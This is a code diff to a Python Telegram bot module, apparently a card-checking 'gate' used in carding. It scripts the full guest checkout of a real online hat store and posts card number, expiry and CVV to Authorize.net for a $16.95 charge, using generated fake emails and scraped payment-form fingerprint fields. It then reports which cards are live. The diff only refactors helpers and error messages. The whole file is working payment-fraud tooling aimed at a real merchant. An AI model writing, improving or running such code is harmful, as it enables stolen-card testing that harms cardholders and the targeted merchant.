@@ -1,5 +1,4 @@
-import requests as r
-import random, time, names
+import time
 from datetime import datetime
 from src.assets.functions import antispam
 from src.assets.connection import Database
@@ -9,7 +8,7 @@ from pyrogram.enums import ParseMode
 from src.extras.checklib import MakeGate, ScrapInfo
 
 BIN_API = "https://bins.antipublic.cc/bins/"
-name_gate = "Authorize"
+name_gate = "Authorized"
 subtype = "16.95$ Charged"
 command = "au"
 
@@ -44,15 +43,10 @@ async def gateway(client: Client, m: Message):
 
 
 async def get_live(card, msg):
-    email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
-    session = ScrapInfo.session()
+    email = ScrapInfo().email_generator()
+    session = ScrapInfo().session()
 
     current_time = datetime.now().strftime("%D - %H:%M:%S")
-    fecha_hora_actual = datetime.now()
-    current_timestamp = int(fecha_hora_actual.timestamp() * 1000)
-    email = f"{names.get_first_name()}{names.get_last_name()}%40gmail.com"
-    four = random.randint(1000, 9999)
-    tree = random.randint(100, 999)
 
     card_split = MakeGate(card).get_card_details()
     ccn = card_split[0]
@@ -61,10 +55,10 @@ async def get_live(card, msg):
     if len(year) == 2:
         year = f"20{card_split[2]}"
     cvv = card_split[3]
-    card_type = card_split[4]
 
     initial_time = time.time()
     data_bin = MakeGate(card).bin_lookup()
+    proxy = session.proxies
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -90,7 +84,6 @@ async def get_live(card, msg):
         "https://millerhats.com/store/index.php?route=checkout/cart/add",
         headers=headers,
         data=data,
-        proxies=proxy,
     )
     current_time = datetime.now().strftime("%D - %H:%M:%S")
     msgg = f"""<b>{current_time} 🌩️</b>
@@ -119,7 +112,6 @@ async def get_live(card, msg):
     response = session.get(
         "https://millerhats.com/store/index.php?route=checkout/checkout",
         headers=headers,
-        proxies=proxy,
     )
 
     await msg.edit_text(
@@ -138,9 +130,7 @@ async def get_live(card, msg):
     }
 
     response = session.get(
-        "https://millerhats.com/store/index.php?route=checkout/guest",
-        headers=headers,
-        proxies=proxy,
+        "https://millerhats.com/store/index.php?route=checkout/guest", headers=headers
     )
 
     # await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)
@@ -178,7 +168,6 @@ async def get_live(card, msg):
         "https://millerhats.com/store/index.php?route=checkout/guest/save",
         headers=headers,
         data=data,
-        proxies=proxy,
     )
 
     # await msg.edit_text("4", parse_mode=ParseMode.MARKDOWN)
@@ -197,7 +186,6 @@ async def get_live(card, msg):
     response = session.get(
         "https://millerhats.com/store/index.php?route=checkout/shipping_method",
         headers=headers,
-        proxies=proxy,
     )
 
     # await msg.edit_text("5", parse_mode=ParseMode.MARKDOWN)
@@ -224,7 +212,6 @@ async def get_live(card, msg):
         "https://millerhats.com/store/index.php?route=checkout/shipping_method/save",
         headers=headers,
         data=data,
-        proxies=proxy,
     )
 
     headers = {
@@ -239,7 +226,6 @@ async def get_live(card, msg):
     response = session.get(
         "https://millerhats.com/store/index.php?route=checkout/payment_method",
         headers=headers,
-        proxies=proxy,
     )
 
     # await msg.edit_text("6", parse_mode=ParseMode.MARKDOWN)
@@ -267,7 +253,6 @@ async def get_live(card, msg):
         "https://millerhats.com/store/index.php?route=checkout/payment_method/save",
         headers=headers,
         data=data,
-        proxies=proxy,
     )
 
     headers = {
@@ -280,23 +265,19 @@ async def get_live(card, msg):
     }
 
     response = session.get(
-        "https://millerhats.com/store/index.php?route=checkout/confirm",
-        headers=headers,
-        proxies=proxy,
+        "https://millerhats.com/store/index.php?route=checkout/confirm", headers=headers
     )
     try:
-        price = ScrapInfo.getStr(
-            response.text,
-            """ <td colspan="4" class="text-right"><strong>Total:</strong></td>
+        price = ScrapInfo().getStr(response.text, """ <td colspan="4" class="text-right"><strong>Total:</strong></td>
         <td class="text-right">$""",
-            "</td>",
+            '</td>',
         )
 
-        login = ScrapInfo.getStr(response.text, 'x_login" value="', '" />')
-        hash_ = ScrapInfo.getStr(response.text, 'x_fp_hash" value="', '" />')
-        invoice = ScrapInfo.getStr(response.text, 'invoice_num" value="', '" />')
-        time_stamp = ScrapInfo.getStr(response.text, 'x_fp_timestamp" value="', '" />')
-        fp = ScrapInfo.getStr(response.text, 'x_fp_sequence" value="', '" />')
+        login = ScrapInfo().getStr(response.text, 'x_login" value="', '" />')
+        hash_ = ScrapInfo().getStr(response.text, 'x_fp_hash" value="', '" />')
+        invoice = ScrapInfo().getStr(response.text, 'invoice_num" value="', '" />')
+        time_stamp = ScrapInfo().getStr(response.text, 'x_fp_timestamp" value="', '" />')
+        fp = ScrapInfo().getStr(response.text, 'x_fp_sequence" value="', '" />')
 
         #  ========= Eight req ========
 
@@ -351,7 +332,6 @@ async def get_live(card, msg):
             "https://secure.authorize.net/gateway/transact.dll",
             headers=headers,
             data=data,
-            proxies=proxy,
         )
 
         # await msg.edit_text("8", parse_mode=ParseMode.MARKDOWN)
@@ -422,10 +402,9 @@ async def get_live(card, msg):
             "https://secure.authorize.net/gateway/transact.dll",
             headers=headers,
             data=data,
-            proxies=proxy,
         )
         card_response = (
-            ScrapInfo.getStr(response.text, "_response_reason_text=", "&x_avs_code")
+            ScrapInfo().getStr(response.text, "_response_reason_text=", "&x_avs_code")
             .replace("+", " ")
             .replace("%21", " ")
         )
@@ -451,13 +430,13 @@ async def get_live(card, msg):
         session.cookies.clear()
         session.close()
 
-    except:
+    except Exception as e:
         final_time = time.time() - initial_time
         msgg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
 ━━━━━━━━━━━
 <a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
 <a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED! ❌<b>
-<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> There is an error with the website, try again.
+<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {e}
 <a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
 ━━━━━━━━━━━
 <code>| Bank Information</code>
